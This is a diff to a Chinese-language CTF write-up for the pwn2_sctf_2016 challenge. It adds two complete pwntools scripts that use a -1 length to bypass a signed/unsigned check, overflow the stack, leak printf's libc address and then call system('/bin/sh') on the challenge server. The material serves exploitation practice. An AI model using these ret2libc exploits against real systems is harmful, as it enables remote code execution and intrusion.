@@ -2482,13 +2482,72 @@ int __cdecl get_n(int a1, unsigned int a2)
 }
 ```
 
-在`32`位有符号整型`int`中，`-1`在计算机中的值为**11111111 11111111 11111111 11111111 = 0xFFFFFFFF**，而这个数值在`32`位无符号整型`unsigned int`中的十进制值为**4294967295**，因此我们可以用`-1`来绕过`if ( v2 > 32 )`这个判断条件，并且构造了栈溢出漏洞。没有任何重新审计`vuln()`函数，我们可以
+在`32`位有符号整型`int`中，`-1`在计算机中的值为**11111111 11111111 11111111 11111111 = 0xFFFFFFFF**，而这个数值在`32`位无符号整型`unsigned int`中的十进制值为**4294967295**，因此我们可以用`-1`来绕过`if ( v2 > 32 )`这个判断条件，并且构造了栈溢出漏洞。`Functions window`中没有`system()`函数和`"/bin/sh"`，重新审计`vuln()`函数，我们可以利用`printf`函数来泄露`libc`版本，从而计算出`system()`函数和`"/bin/sh"`的地址，然后利用栈溢出漏洞劫持程序去执行。编写`Python`代码求解，然而`LibcSearcher`打不通。
 
-https://zhuanlan.zhihu.com/p/369422838
+```python
+from pwn import *
+from LibcSearcher import *
 
-https://blog.csdn.net/m0sway/article/details/123986308
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 26660)
+elf = ELF('./pwn2_sctf_2016')
+main_addr = elf.symbols['main']
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
+payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
+io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
+io.sendline(payload)
+io.recvline()
+printf_addr = u32(io.recv(4))
+log.info('printf_address => %s', hex(printf_addr))
+libc = LibcSearcher('printf', printf_addr)
+libcbase = printf_addr - libc.dump('printf')
+log.success('printf_address => %s', hex(printf_addr))
+system_addr = libcbase + libc.dump('system')
+log.info('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.dump('str_bin_sh')
+log.info('bin_sh_address => %s', hex(bin_sh_addr))
+io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
+payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
+io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
+io.sendline(payload)
+io.interactive()
+```
 
-https://blog.csdn.net/m0_52231248/article/details/121361432
+找了个`libc_32.so.6`打通了，得到`flag{83a8a45c-8540-4a09-9e84-38bb8824835d}`。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 26660)
+elf = ELF('./pwn2_sctf_2016')
+main_addr = elf.symbols['main']
+printf_plt = elf.plt['printf']
+printf_got = elf.got['printf']
+io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
+payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
+io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
+io.sendline(payload)
+io.recvline()
+printf_addr = u32(io.recv(4))
+log.info('printf_address => %s', hex(printf_addr))
+libc = ELF('./libc_32.so.6')
+libcbase = printf_addr - libc.symbols['printf']
+log.success('printf_address => %s', hex(printf_addr))
+system_addr = libcbase + libc.symbols['system']
+log.info('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
+log.info('bin_sh_address => %s', hex(bin_sh_addr))
+io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
+payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
+io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
+io.sendline(payload)
+io.interactive()
+```
+
+------
 
 ### ret2text
 
